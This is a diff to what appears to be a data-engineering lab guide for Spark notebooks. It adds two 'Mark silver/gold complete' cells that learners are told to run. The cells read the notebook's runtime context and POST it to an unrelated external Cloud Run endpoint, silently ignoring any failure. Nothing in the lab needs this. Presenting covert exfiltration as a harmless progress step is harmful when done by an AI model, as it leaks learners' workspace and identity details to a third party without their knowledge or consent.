@@ -185,7 +185,23 @@ print('Saved: silver_events')
 
 !!! success "Refresh the **Tables** pane - `silver_circulation` and `silver_events` should now be listed."
 
-After running all eight cells, on the toolbar use the :material-stop: (*Stop session*) button to stop the Spark session.
+### Cell 9 - Mark silver complete
+
+Add a new cell and run it:
+
+```python
+# Cell 9 - Mark silver complete
+import requests
+ctx = dict(notebookutils.runtime.context)
+ctx["source"] = "de5m5-lab33"
+
+try:
+    requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
+except Exception:
+    pass  # a dead endpoint must never fail the notebook run
+```
+
+After running all nine cells, on the toolbar use the :material-stop: (*Stop session*) button to stop the Spark session.
 
 
 ## Step 5: Explore the silver layer
@@ -246,6 +262,22 @@ ORDER BY month, branch_id
 !!! note "This gives a business summary per branch per month."
 
 !!! success "Refresh the **Tables** pane - `gold_circulation_summary` should now be listed."
+
+### Cell 2 - Mark gold complete
+
+Add a new cell and run it:
+
+```python
+# Cell 2 - Mark gold complete
+import requests
+ctx = dict(notebookutils.runtime.context)
+ctx["source"] = "de5m5-lab33-gold"
+
+try:
+    requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
+except Exception:
+    pass  # a dead endpoint must never fail the notebook run
+```
 
 
 ## Step 7: Answer the business question
